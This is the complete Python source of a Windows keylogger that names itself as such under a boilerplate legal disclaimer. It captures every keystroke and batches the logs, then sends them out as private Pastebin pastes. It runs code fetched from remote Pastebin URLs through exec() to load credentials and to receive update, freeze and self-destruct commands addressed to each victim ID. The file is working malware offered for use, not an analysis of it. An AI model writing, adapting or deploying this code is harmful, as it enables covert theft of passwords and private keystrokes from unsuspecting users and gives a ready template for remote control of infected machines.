# Build: v2024.4.28-source
# Read the legal disclaimer below before using this program.
#
# [Legal Disclaimer]
# The usage of this keylogger project for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. The developers behind the project assume no liability and are not responsible for any misuse or damage caused by this program.

version = {
    "major": 2024,
    "minor": 4,
    "patch": 28
}

import os
import time
import getpass
import shutil
import random
import zlib

py = "312"
usr = getpass.getuser()
data_path = "C:/path/to/data/path"
keylogger_file = "C:/path/to/startup.pyw"

cred_server = "https://pastebin.com/raw/cred_server"
kms_server = "https://pastebin.com/raw/KMS"
update_server = "https://pastebin.com/raw/update_server"
max_file_chars = 100

try:
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime
except ImportError:
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python{py}\\Scripts\\pip.exe install requests -q")
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python{py}\\Scripts\\pip.exe install pynput -q")
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python{py}\\Scripts\\pip.exe install datetime -q")
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime

if os.path.exists(data_path+"/PBIN_CREDS.bin"):
    with open(data_path+"/PBIN_CREDS.bin","r") as creds:
        exec(creds.read())
try:
    credentials = requests.get(cred_server)
    if credentials.status_code == requests.codes.ok:
        exec(zlib.decompress(eval(credentials.content.decode("utf-8"))))
except:
    pass

def on_press(key):
    raw = open(data_path+"/download/data-current.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key."," ")+" \n")
    else:
        raw.write(str(key).replace("'","")+"\n")
    raw.close()
 
    if len(open(data_path+"/download/data-current.bin","r").read().split("\n")) >= max_file_chars:
        i = 0
        while os.path.exists(data_path+"/download/asset"+str(i)+".bin"):
            i += 1
        shutil.copy(data_path+"/download/data-current.bin", data_path+"/download/asset"+str(i)+".bin")
        with open(data_path+"/download/data-current.bin","w") as temp:
            temp.write("")
            temp.close()

def check():
    amt = len(data_path.split("/"))-1
    while amt >= 0:
        if not os.path.exists(data_path+amt*"/.."):
            os.mkdir(data_path+amt*"/..")
        amt -= 1
 
    if not os.path.exists(data_path+"/download"):
        os.mkdir(data_path+"/download")
 
    if not os.path.exists(data_path+"/PBIN_CREDS.bin"):
        pass_keys = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
"1","2","3","4","5","6","7","8","9","0"]
        i,devid = 0,""
        while i < 5:
            devid += pass_keys[random.randint(1,len(pass_keys))]
            i += 1
        with open(data_path+"/PBIN_CREDS.bin","w") as creds:
            creds.write(f"devid = '{devid}'")
            creds.close()

def send():
    if os.path.exists(data_path+"/download/data-current.bin"):
        try:
            i,string = 0,""
            while os.path.exists(data_path+"/download/asset"+str(i)+".bin"):
                string += open(data_path+"/download/asset"+str(i)+".bin").read().replace("\n","")
                i += 1
            string += open(data_path+"/download/data-current.bin","r").read().replace("\n","")
            string = string.replace("  "," ")
 
            login_data = {
                'api_dev_key': key,
                'api_user_name': username,
                'api_user_password': password
            }
            data = {
                'api_option': 'paste',
                'api_dev_key': key,
                'api_paste_code': str(eval("zlib.compress(b'"+string+"')")),
                'api_paste_name': f"KEYLOG [ID: {devid} | DATE: {datetime.now().strftime('%m/%d/%Y @ %I:%M:%S %p')} | BUILD: v{version['major']}.{version['minor']}.{version['patch']}]",
                'api_paste_expire_date': 'N',
                'api_user_key': None,
                'api_paste_private': '1'
            }
 
            login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
            data['api_user_key'] = login.text
            r = requests.post("https://pastebin.com/api/api_post.php", data=data)
            if os.path.exists(data_path+"/download"):
                shutil.rmtree(data_path+"/download")
        except:
            pass

def send_text(title,text):
    try:
        login_data = {
            'api_dev_key': key,
            'api_user_name': username,
            'api_user_password': password
        }
        data = {
            'api_option': 'paste',
            'api_dev_key': key,
            'api_paste_code': text,
            'api_paste_name': title,
            'api_paste_expire_date': 'N',
            'api_user_key': None,
            'api_paste_private': '2'
        }

        login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
        data['api_user_key'] = login.text
        requests.post("https://pastebin.com/api/api_post.php", data=data)
    except:
        pass

def update():
    try:
        b = requests.get(update_server,timeout=60)
    except:
        class b: pass
        b.status_code = 404
    if b.status_code == requests.codes.ok:
        try:
            with open(data_path+"/update.py","wb") as upd:
                upd.write(b.content)
                upd.close()
            if open(keylogger_file,"r").read() != open(data_path+"/update.py","r").read():
                with open(keylogger_file,"wb") as kylgr:
                    kylgr.write(b.content)
                    kylgr.close()
                time.sleep(1)
                exec(open(keylogger_file,"r").read())
        except:
            pass

def upd(ids,url):
    try:
        global update_server
        if "*" in ids or devid in ids:
            update_server = url
            update()
    except:
        pass

def changeid(before,after):
    try:
        if os.path.exists(data_path+"/PBIN_CREDS.bin"):
            with open(data_path+"/PBIN_CREDS.bin","r") as creds:
                exec(creds.read())
            if before == devid:
                with open(data_path+"/PBIN_CREDS.bin","w") as change:
                    change.write(f"devid = '{after}'")
                    change.close()
                send_text("ID Change Successful",f"ID '{before}' was successfully changed to '{after}'.")
    except:
        pass

def loadcreds(ids,url):
    try:
        global username
        global password
        global key
        if "*" in ids or devid in ids:
            credentials = requests.get(url)
            if credentials.status_code == requests.codes.ok:
                exec(zlib.decompress(eval(credentials.content.decode("utf-8"))))
    except:
        pass

check()
try:
    a = requests.get(kms_server,timeout=60)
except:
    class a: pass
    a.status_code = 404
if a.status_code == requests.codes.ok:
    try:
        with open(data_path+"/PBIN_CREDS.bin","r") as creds:
            exec(creds.read())
        exec(a.content)
        with open(data_path+"/PBIN_CREDS.bin","r") as creds:
            exec(creds.read())

        if devid in freeze or "*" in freeze:
            raise SystemExit
        elif devid in freeze_delete_logs or "*" in freeze_delete_logs:
            if os.path.exists(data_path+"/download"): shutil.rmtree(data_path+"/download")
            raise SystemExit
        elif devid in freeze_send_logs or "*" in freeze_send_logs:
            send()
            raise SystemExit
        elif devid in destruct or "*" in destruct:
            if os.path.exists("startup.pyw"): os.remove("startup.pyw")
            if os.path.exists(data_path): shutil.rmtree(data_path)
            if os.path.exists(data_path+"/.."): shutil.rmtree(data_path+"/..")
            raise SystemExit
        elif devid in destruct_send_logs or "*" in destruct_send_logs:
            send()
            if os.path.exists("startup.pyw"): os.remove("startup.pyw")
            if os.path.exists(data_path): shutil.rmtree(data_path)
            if os.path.exists(data_path+"/.."): shutil.rmtree(data_path+"/..")
            raise SystemExit
    except SystemExit:
        raise SystemExit
    except:
        pass
else:
    update()

check()
send()
check()
 
with Listener(on_press=on_press) as listen:
    listen.join()
 
while True:
    time.sleep(0.1)